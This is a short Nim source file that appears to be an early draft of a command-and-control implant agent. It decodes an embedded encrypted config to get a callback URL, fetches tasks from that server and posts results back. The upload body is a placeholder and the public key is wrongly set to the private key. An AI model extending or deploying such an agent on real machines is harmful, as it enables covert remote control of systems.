import asyncdispatch, asyncnet
import sysrandom
import std/base64
import std/os
#third party libraries
import puppy #http comms library
import monocypher
import protocol
import flatty
import config

const LOOKUP_TABLE =
    when defined(release):
        staticRead("../release.config")
    else:
        staticRead("../debug.config")

#retrieves all of the tasks for the agent  
proc getTasks(agent: StaticConfig): string = 
  result = fetch(agent.callback)
  
#posts the task results for the agent
proc postResult(agent: StaticConfig, taskResult: string): string = 
  let req = Request(
    url: parseUrl(agent.callback),
    verb: "post",
    body: "test the post"
  )
  result = fetch(req).body

proc main() =
  let ub64Str = unb64str(LOOKUP_TABLE)
  let encConfig = ub64Str.fromFlatty(EncConfig)
  let context = readEncConfig(encConfig)
  
  let pubKey = encConfig.privKey
  let privKey = encConfig.privKey
  echo context.callback
  let tasks = getTasks(context)
  echo tasks
  let result = postResult(context, tasks)
  echo result

when isMainModule:
  main()
